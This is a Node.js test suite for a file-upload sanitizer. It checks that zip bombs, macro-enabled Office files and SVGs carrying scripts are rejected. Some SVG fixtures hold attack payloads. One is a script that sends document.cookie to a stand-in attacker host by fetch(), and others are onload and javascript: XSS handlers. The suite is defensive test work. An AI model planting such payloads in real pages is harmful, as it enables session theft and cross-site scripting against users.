const test = require('node:test');
const assert = require('node:assert/strict');
const { inspectSvgContent, inspectZipOrOffice } = require('../helpers/sanitizer_oracle');

test('Tier 1 - Feature 19: Malicious File Quarantine & Content Security', async (t) => {
  await t.test('19.1 Zip decompression bomb detection', () => {
    // Construct mock PK zip header declaring 10KB compressed but 2GB uncompressed (ratio 200,000:1)
    const header = Buffer.alloc(32);
    header.writeUInt32LE(0x04034B50, 0); // PK\x03\x04
    header.writeUInt32LE(10240, 18);    // Compressed size = 10 KB
    header.writeUInt32LE(2147483648, 22); // Uncompressed size = 2 GB

    const res = inspectZipOrOffice(header, 'archive.zip');
    assert.equal(res.safe, false);
    assert.match(res.reason, /Zip bomb detected/i);
  });

  await t.test('19.2 SVG containing <script> tag rejected', () => {
    const maliciousSvg = `<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
      <circle cx="50" cy="50" r="40" fill="red" />
      <script type="text/javascript">
        fetch('http://malicious.attacker.com/steal?token=' + document.cookie);
      </script>
    </svg>`;

    const res = inspectSvgContent(maliciousSvg);
    assert.equal(res.safe, false);
    assert.match(res.reason, /<script> tag/i);
  });

  await t.test('19.3 SVG containing inline event handlers rejected', () => {
    const xssSvg = `<svg xmlns="http://www.w3.org/2000/svg">
      <image href="pic.png" onload="alert(document.domain)" />
    </svg>`;

    const res = inspectSvgContent(xssSvg);
    assert.equal(res.safe, false);
    assert.match(res.reason, /inline JavaScript event handler/i);
  });

  await t.test('19.4 SVG containing javascript: URI scheme rejected', () => {
    const uriSvg = `<svg xmlns="http://www.w3.org/2000/svg">
      <a href="javascript:alert(1)"><text y="20">Click Me</text></a>
    </svg>`;

    const res = inspectSvgContent(uriSvg);
    assert.equal(res.safe, false);
    assert.match(res.reason, /javascript: URI scheme/i);
  });

  await t.test('19.5 Macro-enabled Office extensions rejected by policy', () => {
    const dummyBuffer = Buffer.from('dummy Office content');
    const docm = inspectZipOrOffice(dummyBuffer, 'contract.docm');
    assert.equal(docm.safe, false);
    assert.match(docm.reason, /Macro-enabled file extension/i);

    const xlsm = inspectZipOrOffice(dummyBuffer, 'budget.xlsm');
    assert.equal(xlsm.safe, false);
    assert.match(xlsm.reason, /Macro-enabled file extension/i);
  });

  await t.test('19.6 OpenXML ZIP containing vbaProject.bin rejected', () => {
    // OpenXML docx with embedded VBA binary
    const embeddedMacroDocx = Buffer.concat([
      Buffer.from([0x50, 0x4B, 0x03, 0x04]),
      Buffer.from('word/document.xml ... word/vbaProject.bin ... [Content_Types].xml')
    ]);

    const res = inspectZipOrOffice(embeddedMacroDocx, 'contract.docx');
    assert.equal(res.safe, false);
    assert.match(res.reason, /vbaProject\.bin macro code/i);
  });
});
